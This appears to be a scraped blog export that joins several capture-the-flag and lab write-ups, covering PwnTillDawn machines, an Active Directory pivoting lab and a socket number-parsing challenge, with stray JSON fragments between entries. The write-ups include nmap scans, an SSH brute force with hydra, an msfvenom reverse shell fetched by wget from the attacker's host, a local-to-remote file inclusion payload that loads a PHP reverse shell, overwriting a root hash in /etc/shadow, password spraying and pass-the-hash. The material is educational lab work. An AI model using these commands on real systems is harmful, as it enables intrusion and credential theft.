So instead of using the usual flags, we’ll be first checking the open ports and scanning those specific ports after.sudo nmap -p- --open 10.150.150.69Once we find out a list of open ports, we’ll be using Nmap to scan those ports.sudo nmap -sV -sC -p-p135,139,445,3389,5040,44664-49670,50417,60000 -oN nmap.txt 10.150.150.69We can see some interesting information about the machine and it’s internal services. This is a Windows machine with the name of ELMARIACHI-PC, and we can see several ports including port 60000 which looks like a web server. Although we don’t know which service it is running, if we take a closer look on the fingerprint collected by Nmap we can find some tips.This is a ThinVNC server, and it has a web authentication method.ThinVNC ExplorationOnce connecting to the port, we are welcomed with a login prompt.After trying some common usernames and passwords, without success, we need to find another way in. With some research, we can see that the latest verion is 1.01b and funny enough, this version has several known CVEs, including a Rapid7 page telling about a Directory Traversal module on Metasploit.Since ThinVNC latest version is 1.01b, it’s worth a try, so let’s fire up Metasploit and give it a try!Directory Traversal ExploitThis module is quite simple to use as it only requires the remote host IP and port.The output show us that the exploit worked successfully and we now got access to the username desperado with the password TooComplicatedToGuessMeAhahahahahahahh. Let’s try logging in once more.As expected we’ve managed to login and now we just need a machine’s name, which we gathered earlier: ELMARIACHI-PC.We’re presented with a remote desktop access, now it’s time to search for the flag. Let’s start by opening the Explorer.As if wasn’t easy enough to access the machine, the flag is shown in the recent file section of the explorer as FLAG67, now we just have to copy the flag. Fortunately for us, ThinVNC has a clipboard feature available, so once we copy the contents of the file, we can just access this clipboard to paste it outside the machine.",

I don’t often go for SSH port, but I suspect Splunk – a tool meant for monitoring logs – has been installed only to log player’s actions and, since there’s no other port, we’ll be sticking with SSH first.SSH EnumerationThere’s isn’t much you can do against OpenSSH apart from enumeration and checking for CVE’s or bruteforcing top used passwords. We’ll run a Nmap script to see if we can find any useful information another user apart from root.sudo nmap -p22 10.150.150.166 --script ssh-auth-methods --script-args=\"ssh.user=root\"This script returns a list of accepted login methods, which are public key and password, but there’s also a banner text with FLAG35 and a potential user: mike. We could perform the same check again, but the output wouldn’t change.Bruteforcing SSHNow we have a valid user, which we can try to bruteforce using weak passwords. I’ll be using rockyou.txt and use some of the  passwords to see if there’s any match.hydra -l mike -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-50.txt ssh://10.150.150.166After a few seconds we got a match, so we now know that the user mike is available, and it’s password is babygirl.Server ExplorationWith a valid user and password, we can login to the server through SSH. After logging in without any problems, the second flag is available inside mike’s home directory.Usually we would go for a privilege escalation method, but this is even simpler, as mike has privileges to run any command and we have his password. We can just sudo su to the root user.The final flag is inside root’s home directory, nice security Mike!",

        "content": "FullMounty (10.150.150.134)Network ScanningThe target machine uses Linux and has a total of 3 flags. We’ll start by scanning the machine as usual.sudo nmap -sV -sC 10.150.150.134 -oN nmap.txtWe have some interesting results including ports 111, 2049 and 8089. Personally, I don’t always check for SSH unless I really feel there’s something useful on it, as most of the time it’s a dead end.Exploring NFS ShareNFS is a protocol that is used to share files between different hosts and, when misconfigured, can be used to upload malicious files and even root machines. Let’s list this share to see what’s inside.showmount -e 10.150.150.134There’s only one share available on /srv/exportnfs, which we can try to mount on our machine. For this we’ll create a new folder, and use mount to access the contents of the share.mkdir nfssudo mount -t nfs -o vers=3,nolock 10.150.150.134:/srv/exportnfs ./nfsWe can access the share and list it’s contents using ls -la, it’s important to always use the -a flag as you can easily miss hidden files without it.After copying the files, don’t forget to sudo umount the folder.Connecting Through SSHWe’ve achieved the first flag that’s inside the FLAG49, together with SSH key files. We can’t really use a key without a user, can we? Fortunately for us id_rsa.pub file contains a username that we can use.We can now try to SSH into the machine using this key. This step really took me a long time to figure out as the machine uses a legacy SSH version, which requires some special flags in order to perform a successful connection.sudo ssh -o PubkeyAcceptedKeyTypes=ssh-rsa -oHostKeyAlgorithms=+ssh-rsa -i id_rsa deadbeef@10.150.150.134Soon after connecting to the target machine, we can list out the files and discover the next 2 flags in the same folder, but only one of them is readable by our current user which is FLAG50, the other one requires root privileges.Privilege EscalationThis step is quite tricky, as due to how old the machine is, there’s a couple of different methods, some are easier than others. We can use Linux Exploit Suggester to find out different methods. The more obvious being Dirty Cow, this can be seen by verifying the kernel and OS version.The real problem is that the machine doesn’t have a compiler installed, so you’ll have to compile the exploit externally and upload it to the target, which wouldn’t be a problem if wasn’t for the fact that it requires the same OS version, and nobody even remember that Ubuntu 10.04 even existed, neither there’s a docker container available. The alternative is to use Metasploit modules which is simpler, so we’ll stick to that.If you decide to use linux-exploit-suggester, you’ve probably seen that CVE-2010-3904 is listed as a highly probable exploit.By Googling it, we can see Metasploit has a module for this vulnerability, which we can use easily, and it also tells us that the exploit has been tested on Ubuntu 10.04 with the exact same kernel version we’re working on, that’s great!As this is a local exploit, we’ll use msfvenom to create our meterpreter reverse shell and before uploading it to the target machine.sudo msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=10.66.66.230 lport=1337 -f elf -o reverseLuckily we have access to wget in the target machine, so we’ll be using python to transfer the binary with the command python -m http.server and use it to transfer the malicious binary.wget -o- http://10.66.66.230:8000/reverseNow, back to our machine, we’ll start Metasploit and use the multi/handler module to listen for connections from our previous uploaded binary.sudo msfconsoleNow let’s go back to the target machine and run our binary.chmod +x reverse./reverseNow, I know how tempting is to explore the new openly shell, but we’ll just bg so this session will be sent to the background, as we’ll run our privilege escalation exploit.And now we just run the exploit and profit!I’ve used this method because I really think it’s faster than creating a VM with the specific OS version and compiling the exploit by hand. Besides, Metasploit can do the heavy lifting for us, no need to reinvent the wheel.After typing shell, just use /bin/bash -i for an interactive shell and print out the FLAG51 file, voilá!I really had fun playing this challenge, it taught me how to adapt, as understanding sometimes things won’t go so smoothly as expected, it’s important to understand how different tools can be used for the same job.",

Interestingly enough, any other file apart from the web pages isn’t working, still, we don’t know the reason.Local File InclusionOne cool trick I’ve learned is that you can use PHP wrappers to retrieve file contents by converting them into base64 strings, we can try reading the page index and have a peek on the code.http://10.150.150.18/index.php?page=php://filter/convert.base64-encode/resource=index.phpYet, by some reason, even index.php isn’t working, but when we try to do the same with home page, it works like a charm. So we know this vulnerability do exist.http://10.150.150.18/index.php?page=php://filter/convert.base64-encode/resource=index.phpIn this case, I can only assume that’s the page is appending the .php extension, and we can type index without the extension. Yes, we could try bypassing it somehow and accessing the server files, yet, understanding the code internal workings is our best bet to easily exploit the server.http://10.150.150.18/index.php?page=php://filter/convert.base64-encode/resource=indexIt works! After decoding the contents of the Base64 string, we can confirm our previous theory.&lt;?phpif (empty($_GET)) {\theader('Location: /index.php?page=home');} else {\t$page = $_GET['page'];\tinclude ($page. '.php');}?&gt;This code snippet adds the .php extension to whatever text we add in the URL, and using %00 doesn’t work, but what we can do is try to reach external server and see if this escalates to a Remote File Inclusion vulnerability.Remote File InclusionTo test this theory, what we can do is to run a local server within our machine and perform a request to any file.python -m http.serverBack to the web page, we’ll type the following URL:http://10.150.150.18/index.php?page=http://10.66.66.230:8000/randomAnd back to our terminal:Uploading a ShellGreat, we can now try to use this and load a PHP reverse shell to get access. I’ll be using Pentest Monkey’s PHP Shell. Remember to change the shell options to your IP address and port before using it.Now we just have to start a listener using netcat on the same port and request the file in our machine omitting the extension and voilá!The first flag is available on the /home/snare directory inside the machine.Privilege EscalationNow, assuming the next one is inside /root folder, we must find a way to escalate our privileges. Looking for binaries, kernel and OS version, among other stuff would take too long, we can use LINPEAS-ng which a bash script that does this for us and list potential escalation methods.Normally it would take just a simple command to use it, but since PwnTillDawn machines can’t connect outside the VPN’s network, you must download and follow the same usage describe in this page.From the output, we can see the /etc/shadow file has read/write permissions to any user, which means we can easily root the machine by accessing the account hash and changing it inside the file.mkpasswd -m sha-512 pwnedThis command will generate a new hash on the attacker with whatever password you want, now back to the target, you can use nano to edit the file and change root’s password hash by simply deleting it and pasting the newly hash.Notice only the hash should be replaced, the others values separated by : must stay the same.Once done, just use the su command to access root account, and type the password you’ve just created, which in my case was pwned.Finally, the final flag is available inside /root by the name of FLAG2.txt.",

        "content": "It’s been a while since someone told me to start writing a blog about what I’m learning, and finally after all there years I’ve decided it might be a good idea to do so. So since I’ve decided I have a lot to learn about Windows OS, so in the meantime I’ll be posting a lot about my studies on Windows machines. Also, I’ll be focusing on HackTheBox machines, but not only those, I’ll be writing write-ups on my college challenges too. But without futher ado, let’s hack on.Understanding the networkSo before we start hacking, we must understand what are we dealing with. So here’s the network diagram.As you can see, we have 3 servers, the first one being a Linux Box, which we’ll be using to access an AD (Active Directory) server, as well as a confidential repository. Now, for the spoiler: Our objective here is to gain access to the confidential repository by pivoting our connection through the Linux server, and for this we’ll be using sshuttle, as well as some enumeration and post-exploitation tools for Windows. OBS: We’ll be starting from the point we’ve already compromised the Linux server.Pivoting with sshuttleSo first things first, we need to reach the subnet, don’t we? We could be using ssh -D to set a dynamic port, but as far as I learned, it’s not a go-to  option since it messes with nmap scans as well as exploit delivering, so instead of using Dynamic SSH tunnels, we’ll be using sshuttle, which is a great tool for pivoting and don’t require you to root the pivoting machine, only on the attacker’s local machine, and it’s pretty easy to install, so just go to your Kali Linux, Parrot or whatever it is your distro, and type sudo apt install -y sshuttle inside your terminal, by the way I’m almost 100% sure it’s included by default in Kali Linux distros.Dump &amp; SprayKnow that now we’re inside the target’s subnet, and this means we can continue the hack with further exploration. We’ll not try connecting directly to Confidential Repository since I already know this isn’t going to work. One of the most useful techniques I’ve learned recently is Password Spraying which basically represent using a password you’ve found and try using it to login in every single account you can. We have a password, but no accounts, so our next step is to list accounts available on the server, and for this we’ll be using ldapdomaindump.Now we’ve managed to find a user list, we’re going to use awk to parse the information we need in order to start a password spraying attack. Note that using this attack will surely trigger the SOC team, so be careful when doing so, but here I’m using a custom lab, so we’re good. Now we parse the users to a list for further usage.$ awk '{if (NR!=1) {print $1}}' domain_users.grep &gt; user.lstThis command will remove the first line of the domain_users.grep, get all usernames in the first column and put inside the user.lst file. The output should come like so:$ head -n10 user.lst ITAdminval.johnsontroy.underbridgetony.gardnertom.peetstodd.packertoby.flendersonthe.snakesstephanie.jorgestanley.hudsonNow that we have plenty of users, let’s use the for the password spraying by using crackmapexec:We found out that user Goro.Takemura uses the same password as the user we’ve already compromised, and by looking inside the groups files we can see that this user is also an Administrator so now we can use this user to get NTLM hashes from the other accounts with secretsdump.py comes inside Impacket program suite.Pass2WinWith all these hashes we’ve just obtained, we can try a new technique I’ve just learned about, it’s called PassTheHash, which basically allows us to impersonate another user without need of the plaintext password to login. For this we’ll now use xfreerdp which is mainly used for RDP connections. The only problem left to solve is which one of the users is allowed to RDP, and spoiler: It’s not the ITAdmin, but if you’ve played Cyberpunk 2077, you can tell it could be the protagonist of the game, V, and if you said so, congratulations, you’re right. In the process of solving this challenge I’ve made bash script to automate the process of trying each user and hash until some user login, but we’re not doing this here, so let’s just connect to the Confidential Repository:After this command, another windows pops up, with a RDP session opened on it, we’re now able to access machine’s information, and check which user are we currently logged on.Also, the flag is inside the database.txt file, which has the following message:This challenge showed me that I have a LOT to learn about Windows machines as said early, but also showed me how fun it is to bypass Windows protections and how some techniques could be applied in real life scenaries, hope you’ve learned something new too.

        "category": "",
        "content": "The ChallengeThe challenge appears to be relatively simple. Upon connecting to numb3rs.hopto.org:8012, we are greeted with the following message:It is expected that you send back the number displayed on the screen, and this is the message received if the response is correct:We can also note that if the response takes too long to be sent, whether it is correct or not, the server stops responding to the connection, leaving us with no other option but to terminate the connection:It’s easy to see that (unless you have the patience and fingers of a master pianist) we can’t simply do this by typing manually. So, let’s write a program that can solve this problem for us.The ProblemTo solve this, we need to analyze what is being sent over the connection when we open it. While this can be done using various methods, we will use Python for this task.import sockethost = \"numb3rs.hopto.org\"port = 8012# Pro tip: Did you know that you can use sockets with the \"with\" statement instead of the traditional method with variables?with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:    s.connect((host, port))    data1 = s.recv(1024)    data2 = s.recv(1024)    print(data1)print(data2)Notice that we use s.recv(1024) twice to receive data. This is because the server sends us two messages instead of just one, and the numbers are always shown in the second message. I should mention that when we get the answer right, we receive two responses again: one is a confirmation that we were correct, and the other contains the next number.The problem is that the server never sends us the numbers in a readable form; instead, it sends strings representing the numbers. So, we need to think about how to read the received values and interpret them accordingly.An Elegant SolutionTo handle this challenge, the best approach is to understand that each number is represented by a string. This means we can create a dictionary to map each string to its corresponding number. Before creating the dictionary, we need to separate the responses appropriately so that we can build it.import socketfrom pprint import pprint as pphost = \"numb3rs.hopto.org\"port = 8012with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:    s.connect((host, port))    _ = s.recv(1024)    data = s.recv(1024).decode()    print(data)pp([string.strip() for string in data.split(\"\\n\\n\")])The function pprint comes from Pretty Print and is useful when you need to print messages in a readable format. We use strip. We also replaced the variable data1 with _ since we won’t need that information in the code. And we have the following response:The first two lines and the last line are not actually relevant, but that’s not a problem. Nevertheless, we still need to handle the \\n characters in the code, and we can do that using replace.pp([string.replace(\"\\n\", \"\").strip() for string in data.split(\"\\n\\n\")])Now we have the numeric strings in the cleanest form possible, which is good. We can finally create the dictionary. To get each string, we just need to run the code a few times to capture all 10 possible digits, and then we have our dictionary. Due to some random unforeseen issues, unfortunately, I can’t directly provide the code here, but the dictionary should look like this:With this dictionary, we can convert the strings into their respective numbers, and then we will have the answer.answer = [    numbers.get(string.replace(\"\\n\", \"\").strip(), None) for string in    data.split(\"\\n\\n\")]print(\"\".join(answer))When running the code, we get the following result:This error occurs for the following reason: if the get function isn’t used in the dictionary, strings that don’t exist in the dictionary would cause an error. That’s why we use get, so we can define a default value if the string isn’t found. However, when trying to use join on the list of numbers, the None value caused this error, and to fix this, we need to remove that value. The filter function is ideal for this situation because it can remove all unwanted values from the list and leave only those that matter. As mentioned before, the irrelevant strings are not a problem.print(\"\".join(list(filter(None, answer))))With this small error corrected, we can run the code again and get the expected answer.The OutcomeNow, all that remains is to create a loop that repeats this action 1337 times and also sends the information back to the server. This is the simplest part.import sockethost = \"numb3rs.hopto.org\"port = 8012numbers = {\t# Previously obtained dictionary}with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:    s.connect((host, port))    for _ in range(1337):        _ = s.recv(1024)        data = s.recv(1024).decode()                print(data, end=\"\")        answer = [        \tnumbers.get(string.replace(\"\\n\", \"\").strip(), None)        \tfor string in data.split(\"\\n\\n\")        ]        answer = \"\".join(list(filter(None, answer)))        s.send(bytes(answer, \"utf-8\"))        print(answer)We removed the pprint function from the code since we no longer need it. We created a for loop to repeat the actions of receiving, translating, and sending information 1337 times. We used s.send(bytes(answer, 'utf-8')) to send the response in byte format so the server can understand it. Now, all we need to do is execute the code one last time, and voilà, we have our flag.The final flag is FIAP{th353_nuMb3r5_4r3_s0_b0r1n6!}. It was a lot of fun figuring out how to solve this challenge. It also helps us understand how to manipulate strings, work with sockets, and use dictionaries effectively. So that’s it, I hope I’ve taught you something new, and Hack On!",
